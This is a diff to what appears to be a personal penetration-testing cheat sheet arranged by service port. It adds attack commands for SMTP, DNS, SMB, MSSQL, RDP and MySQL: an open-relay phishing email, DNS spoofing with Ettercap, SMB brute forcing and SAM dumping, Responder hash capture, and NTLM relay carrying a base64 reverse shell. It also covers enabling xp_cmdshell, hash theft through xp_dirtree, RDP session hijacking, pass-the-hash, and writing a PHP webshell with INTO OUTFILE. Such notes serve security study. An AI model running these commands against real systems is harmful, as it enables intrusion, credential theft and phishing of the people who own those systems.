@@ -30,6 +30,8 @@
 
 **Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)
 
+- `hashid` to identify the type of hash
+
 - john:
 
   ```bash
@@ -37,7 +39,11 @@
   john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
   ```
 
-  
+- hashcat
+
+  ```bash
+  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+  ```
 
 - zip files: johnthe ripper, use zip2john to convert it
   - `zip2john backup.zip > backup.hash`
@@ -331,10 +337,6 @@ Authentication, Read/Write
 
 #### Exploit:
 
-- Anonymous login: anonymous:anonymous
-
-- Brute forcing
-
 - File upload
   - LFI
   - with web servers, it is common that files are synchronized
@@ -491,7 +493,7 @@ ssh -v [USER]@[IP] -o PreferredAuthentications=[PASSWD]
   - `DATA`  initiates the transmission of the email.
   - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
   - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
-  - `EXPN`  checks if a mailbox is available for messaging with this command.
+  - `EXPN`  checks if a mailbox is available for messaging with this command. When used with a distribution list, it will list all users on that list.
   - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
   - `QUIT`  terminates the session.
 
@@ -512,17 +514,27 @@ ssh -v [USER]@[IP] -o PreferredAuthentications=[PASSWD]
 
 - `evolution` (GNOME Desktop)
 
-  
+- **User enumeration**
 
+  ```bash
+  smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
+  ```
 
+​	To try with domain usually only for RCPT.
 
-#### Footprinting
+#### Exploit
 
-```bash
-smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
-```
+- **Open Relay** -> Phishing or spoofing
 
-To try with domain usually only for RCPT.
+  Messaging servers that are accidentally or intentionally configured as  open relays allow mail from any source to be transparently re-routed  through the open relay server.
+
+  1. `nmap smtp-open-relay` tests if an open relay is possible.
+
+  2. Use any mail client to connect to the mail server and send our email.
+
+     ```bash
+     swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+     ```
 
 ### 53 - DNS
 
@@ -535,7 +547,7 @@ To try with domain usually only for RCPT.
 
 - Encryption:
 
-  DNS is mainly unencrypted. Devices on the local WLAN and Internet  providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.
+  DNS is mainly unencrypted. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.
 
 - Types of DNS Servers:
 
@@ -595,7 +607,7 @@ To try with domain usually only for RCPT.
 
   Text file that describes a DNS zone with the BIND file format. 
 
-   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record. 
+   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record for a domain to have zones. 
 
 - *reverse name resolution files* `/etc/bind/db.10.129.14`
 
@@ -603,50 +615,65 @@ To try with domain usually only for RCPT.
 
 #### Footprinting
 
-- Name Servers:
+- General info:
 
   ```bash
-  dig ns [NAME_SERVER] @[DNS SERVER] {+short}
+  # Name Servers
+  dig ns [DOMAIN] @[IP]] {+short}
+  # Version
+  dig CH TXT version.bind [IP]
+  # Available records
+  dig ANY [DOMAIN] @[IP]
   ```
 
-- Version:
+- **Zone Transfer**
+
+  ```
+dig axfr [DOMAIN] @[IP]
+  ```
+
+  This should be done recursively on the new discovered domains.
+  
+  A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. One can try asking a DNS server for a copy of its zone information.
+
+- **SubDomain Brute Forcing**
+
+  -  [DNSenum](https://github.com/fwaeytens/dnsenum)
+
+    ```bash
+    dnsenum --dnsserver [IP] --enum -p 0 -s 0 -o subdomains.txt -f [WORDLIST] [DOMAIN]
+    ```
+
+  - Subbrute (more precise but slower)
+
+    ```bash
+    cd TOOLS/subbrute
+    ./subbrute.py [DOMAIN] -s ./names.txt -r ip.txt
+    ```
+
+#### Exploit
+
+- **Domain Takeover** (only public)
+
+  Registering a non-existent domain name to gain control over another domain.
 
   ```bash
-  dig CH TXT version.bind [DNS SERVER]
+  host [SUBDOMAIN]
   ```
+  
+  If the domain name uses a CNAME record to another domain, which expired. In that case, anyone who registers to it will have complete control over the domain, until the DNS record is updated.
+  
+  After finding one, one can check it [here](https://github.com/EdOverflow/can-i-take-over-xyz)
 
-- View all available records
+- **DNS Spoofing**
 
-  ```bash
-  dig ANY [NAME_SERVER] @[DNS SERVER]
-  ```
+  Altering DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. 
 
-- Zone Transfer
-
-  Transfer of zones to another server in DNS, This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`)
-
-   DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master  is called a slave. The slave fetches the `SOA` record of the relevant zone from  the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA  record of the master is greater than that of the slave, the data sets no longer match.
-
-  ```
-  dig axfr [NAME_SERVER] @[DNS SERVER]
-  ```
-
-  If the administrator used a subnet for the `allow-transfer` option or set it to `any`, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.
-
-  ```
-  dig axfr [ZONE].[NAME_SERVER] @[DNS SERVER]
-  ```
-
-  The individual `A` records with the hostnames can also be found out with the help of a brute-force attack:
-
-  - If the Zone transfer fails, it means that you don't have access to those subdomain, thus you can do *SubDomain Brute Forcing* [DNSenum](https://github.com/fwaeytens/dnsenum)
-
-
-  ```bash
-dnsenum --dnsserver [DNS_SERVER] --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt [DOMAIN]
-  ```
-
-
+  1. Map in the `/etc/ettercap/etter.dns` file, the target domain to the attacker's IP
+  2. Start `Ettercap` and scan for live hosts `Hosts > Scan for Hosts`. 
+  3. Add the target IP address to Target1 and add a default gateway found in step 2. IP to Target2.
+  4. Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`.
+  5. if a victim user coming from the target machine visits the domain on a web browser, they will be redirected to a `Fake page` that is hosted on the attacker's IP address.
 
 ### 69u - TFTP
 
@@ -685,6 +712,8 @@ tftp
 #### Configuration
 
 In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.
+
+By default, `POP3` clients remove downloaded messages from the email server, while `IMAP` doesn't making the latter one more interesting. 
 
 **Dangerous Settings:**
 
@@ -819,7 +848,7 @@ In the documentation of Dovecot, we can find the individual [core settings](http
   /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
   ```
 
-### 135, 137-9, 445 - SMB
+### 135, 137-9, 445 - RPC, NetBIOS, SMB
 
 #### Generalities:
 
@@ -840,14 +869,46 @@ In the documentation of Dovecot, we can find the individual [core settings](http
 
   In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network.
 
-#### Footprinting
+#### Configuration
 
-- nmap
+- `/etc/samba/smb.conf` to change settings
+- Dangerous settings:
+  - `browseable - yes`: Allow listing available shares in the current share
 
-- rpccclient
+#### Interaction
+
+- `netexec`
 
   ```bash
-  rcpclient -U "user" [IP]
+  # List shares
+  nxc smb [IP] -u '' -p '' --shares	
+  # Download downloadable files
+  nxc smb [IP] -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+  # Get the password policy, if the Account Lockout Threshold is None brute forcing is possible
+  nxc smb [IP] -u '' -p '' --pass-pol
+  # Brute-forcing on the two possible login methods
+  nxc smb -u [USER_LIST] -p [PASS_LIST] -d [DOMAIN]
+  nxc smb -u [USER_LIST] -p [PASS_LIST] --local-auth	# Also hydra
+  
+  # ----------ACTIVE DIRECTORY----------
+  
+  # Run command (also on multiple hosts at the same time)
+  nxc smb [IP] -u [USER] -p '[PASS]' -x 'whoami' --exec-method smbexec
+  
+  # Enumerating logged on Users
+  nxc smb [IP] -u [USER] -p '[PASS]' --loggedon-users
+  
+  # Extract Hashes from SAM Database (administrative privileges)
+  nxc smb [IP] -u [USER] -p '[PASS]' --sam
+  
+  # Log in with NTLM hashed password
+  nxc smb [IP] -u [USER] -H [HASH]
+  ```
+
+- `rpccclient`
+
+  ```bash
+  rcpclient -U "user" [IP]	# -U'%' to anonymous login
   ```
 
   - `srvinfo`  Server information.
@@ -865,28 +926,30 @@ In the documentation of Dovecot, we can find the individual [core settings](http
   ```bash
   for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
   ```
-  
+
   - `seq 500 1100` generates a sequence of numbers from 500 to 1100
   - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)
-  
+
 - `smbclient`
 
-  - `smbclient -N //[IP ADDRESS]{/FOLDER}`
-  
+  - `smbclient //[IP ADDRESS]{/FOLDER}`
     - `-N` anonymous access
+    - `-U` specify user
   - `-L` display the list of shares (only to display without access!!)
   
+  - The ones accessible without authentication don't have the dollar sign `$`
   
-    The ones accessible without authentication don't have the dollar sign `$`
+    - `cd`, `ls`, and to download a file `get`.
   
-  - `cd`, `ls`, and to download a file `get`.
   
-  - `!<cmd>` to execute local system commands without interrupting the connection
+    - `!<cmd>` to execute local system commands without interrupting the connection
   
-  - `smbstatus` shows the version and who, from which host, and which share the client is connected
-
-  - `psexec` to open a shell
-
+  
+    - `smbstatus` shows the version and who, from which host, and which share the client is connected
+  
+  
+    - `psexec` to open a shell
+  
 - `smbmap`
 
   ```bash
@@ -912,6 +975,12 @@ In the documentation of Dovecot, we can find the individual [core settings](http
 - [SMBMap](https://github.com/ShawnDEvans/smbmap)
 
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+
+- `impacket`
+
+  - ```bash
+    impacket-psexec [USER]:[PASS]@[IP]
+    ```
 
 -  Windows `CMD`
 
@@ -954,16 +1023,58 @@ In the documentation of Dovecot, we can find the individual [core settings](http
     Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
     ```
 
-**Exploit**
+#### Exploit
 
-- Anonymous Login
-- EternalBlue: anything that uses SMBv1 is at risk
+- **EternalBlue:** anything that uses SMBv1 is at risk
 
-**Configuration**
+- **SMBGHOST**: SMB v3.1.1 RCE
 
-- `/etc/samba/smb.conf` to change settings
-- Dangerous settings:
-  - `browseable - yes`: Allow listing available shares in the current share
+  It is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. 
+
+- **Forced Authentication:**
+
+  Create a fake SMB server to capture users hashes.
+
+  When you try to connect to a network location (like a shared folder), your computer needs to find its IP address. It does this by following a series of steps:
+
+  1. **Check the hosts file** (a local file with address records).
+  2. **Check the local DNS cache** (a memory of recently resolved addresses).
+  3. Ask the configured DNS server if no local records are found.
+  4. If all else fails, **broadcast a request to all devices on the network**, asking for the address.
+
+  If the name you type is wrong (e.g., `\\mysharefoder\` instead of `\\mysharedfolder\`), the computer can't find the correct address. It will eventually broadcast a request to the whole network.
+
+  Here’s the risk: attackers can intercept this broadcast and send a fake response, tricking your computer into trusting their malicious server. This is often used to steal sensitive information, like login credentials.
+
+  ```bash
+  sudo responder -I [INTERFACE]
+  ```
+
+  Hashes are saved in `/usr/share/responder/logs/`
+
+  - If the hash cannot be cracked, you can use the hash to log in to another server:
+
+    1. Set `SMB = OFF` and `HHTP = OFF` in `/etc/responder/Responder.conf`
+
+    2. Turn on responder
+
+    3. Use netexec to see what servers IPs are vulnerable to the attacks, that is the ones with SMBsigning sets to off (signing:False):
+
+       ```bash
+       nxc smb [IP RANGE]
+       ```
+    
+    4. Generate Reverse Shell Base 64 and open listener
+    
+    5. Relay with `impacket-ntlmrelayx`:
+    
+       ```bash
+       impacket-ntlmrelayx --no-http-server -smb2support -t [VULNERABLE_IP]-c '[REV SHELL BASE64]'
+       ```
+    
+       
+
+
 
 ### 143, 993 IMAP
 
@@ -1291,7 +1402,7 @@ rsync -av --list-only rsync://[IP]/[SHARE]
   - with the server authentication;
 
     ```cmd
-    sqlcmd -S localhost -U your_username -P your_password
+    sqlcmd -S localhost -U your_username -P your_password 
     ```
 
   - The interaction is the same as below, but you need to run `GO` after every command.
@@ -1299,6 +1410,8 @@ rsync -av --list-only rsync://[IP]/[SHARE]
 - **Default credentials:** `sa` and empty passwd 
 
 ```bash
+# Get Server Name
+SELECT @@SERVERNAME AS ServerName;
 # Get version
 select @@version;
 # Get user
@@ -1327,7 +1440,100 @@ EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
 enum_links
 #Use a link
 use_link [NAME]
+
+# Execute commands (if enabled)
+xp_cmdshell 'whoami'
+# Enable xp_cmdshell (with appropriate privileges)
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
 ```
+
+#### Exploit
+
+- **Write**
+
+  To write files, [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) must be enabled:
+
+  ```bash
+  # Enable Ole to write files
+  sp_configure 'show advanced options', 1
+  RECONFIGURE
+  sp_configure 'Ole Automation Procedures', 1
+  RECONFIGURE
+  ```
+
+  - [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), 
+
+  - [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), 
+  - [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15),
+  -  [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). 
+
+- **Read Local files**
+
+  ```bash
+  SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+  ```
+
+- The `xp_regwrite` command is used to elevate privileges by creating new entries in the Windows registry.
+
+- **Capture Hashes**
+
+  1. Start `responder` or `impacket-smbserver`
+
+     ```bash
+     sudo responder -I tun0
+     ```
+
+     ```bash
+     sudo impacket-smbserver share ./ -smb2support
+     ```
+
+  2. Hash stealing
+
+     ```bash
+     EXEC master..xp_dirtree '\\[RESPONDER IP]\share\'
+     
+     EXEC master..xp_subdirs '\\[RESPONDER IP]\share\'
+     ```
+     
+  3. Crack the Hash
+
+  4. If cracking doesn't work, relay
+
+- **IMPERSONATE to Privesc**  
+
+   Sysadmins can impersonate anyone by default.
+
+  ```bash
+  # Identify which Users we can impersonate
+  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+  GO
+  
+  # Impersonate an User (e.g. sa) - Recommended within the master DB 
+  EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+  GO
+  
+  # Revert the operation and return to our previous user
+  REVERT
+  ```
+  
+- **Communicate with other DB**
+
+  If we manage to gain access to a SQL Server with a linked server  configured, we may be able to move laterally to that database server. 
+
+  ```bash
+  # Identify linked Servers (0 is a linked server)
+  SELECT srvname, isremote FROM sysservers
+  
+  # Execute command in the linked server
+  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[LINKED SERVER]]
+  # The output will be 4 numbers, 0 for False and 1 for True
+  # If you need quotes in the EXECUTE command, use double quotes inside
+  ```
+  
+  
 
 ### 1521 - ORACLE
 
@@ -1452,10 +1658,6 @@ If the client does not specify a SID, the default value defined in the `tnsnames
   - For an RDP session to be established, both the network firewall and the  firewall on the server must allow connections from the outside.
   - all data, and especially the login process, is protected in the network  by its good encryption. However, many Windows systems do not insist on  this but still accept inadequate encryption.
 
-#### Exploit
-
-- The identity-providing certificates are merely self-signed by default, so the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.
-
 #### Interaction
 
 - [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) can unauthentically identify the security settings of RDP servers based on the handshakes.
@@ -1470,7 +1672,51 @@ If the client does not specify a SID, the default value defined in the `tnsnames
   xfreerdp /u:[USER] /p:"[PASSWD]" /v:[IP]
   ```
 
+#### Exploit
 
+- The identity-providing certificates are merely self-signed by default, so the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.
+
+- **Session Hijacking** (*no longer works on Server 2019*)
+
+  Go from one user to another
+
+  - Get active users with `query user` 
+
+  - If you have SYSTEM privileges (or if you are admin and you can run the terminal as Administrator by right click):
+
+    ```cmd
+    tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]
+    ```
+
+  - If have Administrator privileges:
+
+    1. Create a service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges.
+
+       ```cmd
+        sc.exe create service binpath= "cmd.exe /k tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]"
+       ```
+
+    2. Start the service
+
+       ```cmd
+       net start service
+       ```
+
+- **Pass-the-Hash (PtH)**
+
+  Login using only the hash
+
+  1. Enable `Restricted Admin Mode`
+
+     ```cmd
+     reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+     ```
+
+  2. ```cmd
+     xfreerdp /v:[IP] /u:[USER] /pth:[HASH]
+     ```
+
+- **BlueKeep (RCE without Auth) **[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
 
 ### 3632 distccd
 
@@ -1562,17 +1808,12 @@ The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if
 - The entries of `user`,`password`, and `admin_address` are made in plain text
 - The `debug` and `sql_warnings` settings provide  verbose information output in case of errors, which often contains sensitive content
 
-#### Exploits
-
-- SQL injection
-- Read credentials
-
 #### Interaction
 
-- Linux:
+- Linux: (try both logins)
 
   ```bash
-   mysql -h [IP] -u root -p[PASSWD] --skip-ssl
+  mysql -h [IP] -u root -p[PASSWD]
   ```
 
 - Windows:
@@ -1585,17 +1826,60 @@ The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if
 
 The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.
 
-| **Command**                                          | **Description**                                     |
-| ---------------------------------------------------- | --------------------------------------------------- |
-| `select version();`                                  | Get version                                         |
-| `show databases;`                                    | Show all databases.                                 |
-| `use <database>;`                                    | Select one of the existing databases.               |
-| `show tables;`                                       | Show all available tables in the selected database. |
-| `show columns from <table>;`                         | Show all columns in the selected database.          |
-| `select * from <table>;`                             | Show everything in the desired table.               |
-| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.    |
+```bash
+# Get version
+select version();
+# Show all databases.
+show databases;
+# Select one of the existing databases.
+use <database>;
+# Show all available tables in the selected database.
+show tables;
+# Show the columns of a selected table.
+show columns from <table>;
+# Show everything in the desired table.
+select * from <table>;
+# Search for string in the desired table.
+select * from <table> where <column> = "<string>";
+```
 
+#### Exploits
 
+- SQL injection
+
+- **Write**
+
+  - [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). 
+
+  - If connected to a web server:
+
+    - Check read/write privileges
+
+      ```bash
+      show variables like "secure_file_priv";
+      ```
+
+      - If empty, the variable has no effect, which is not a secure setting.
+      - If set to the name of a directory, the server limits import and export operations to work only with files in that directory.
+      - If set to NULL, the server disables import and export operations.
+
+    - Write a file in the webserver directory 
+
+      ```bash
+      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+      ```
+
+    - Browse to the location where the file is and execute our commands.
+
+- **Read Local Files** (not allowed by default)
+
+  ```bash
+  select LOAD_FILE("/etc/passwd");
+  ```
+
+- **Authentication bypass v5.6.x**
+
+  The server takes longer to respond to an incorrect password than to a  correct one. Thus, repeatedly authenticate with the same  incorrect password, will work.
 
 ### 6379 - REDIS
 
@@ -2149,7 +2433,7 @@ Now we have to write one of the web shells above in the web root
 | `Apache`   | /var/www/html/         |
 | `Nginx`    | /usr/local/nginx/html/ |
 | `IIS`      | c:\inetpub\wwwroot\    |
-| `XAMPP`    | C:\xampp\htdocs\       |
+| `XAMPP`    | C:\\xampp\htdocs\      |
 
 We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 
 
@@ -2722,6 +3006,8 @@ sudo nmap -p[PORT] 127.0.0.1
 ## Jail Brekout
 
 ### Docker
+
+To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
 
 - If you are root you can read the shadow password file `/etc/shadow`
 
